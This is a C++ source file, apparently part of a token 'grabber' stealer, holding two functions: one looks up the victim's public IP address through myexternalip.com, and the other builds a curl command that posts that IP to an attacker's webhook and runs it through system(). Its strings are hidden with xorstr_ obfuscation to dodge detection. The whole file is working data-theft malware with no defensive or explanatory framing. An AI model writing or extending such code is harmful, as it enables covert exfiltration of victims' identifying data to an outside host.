#include "grabber.h"

std::string grabbertoken::real_ip()
{

    HINTERNET net = InternetOpen(xorstr_("IP retriever"),
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET conn = InternetOpenUrl(net,
        xorstr_("http://myexternalip.com/raw"),
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0);

    char buffer[4096];
    DWORD read;

    InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
    InternetCloseHandle(net);

    return std::string(buffer, read);
}

void grabbertoken::grabip()
{
    std::string command = xorstr_("curl --data \"username=") + webhookname + xorstr_("&content=```ipaddres: ") + real_ip() + xorstr_("```&avatar_url=") + avatar_url + "\" " + webhook_url;
    system(command.c_str());
}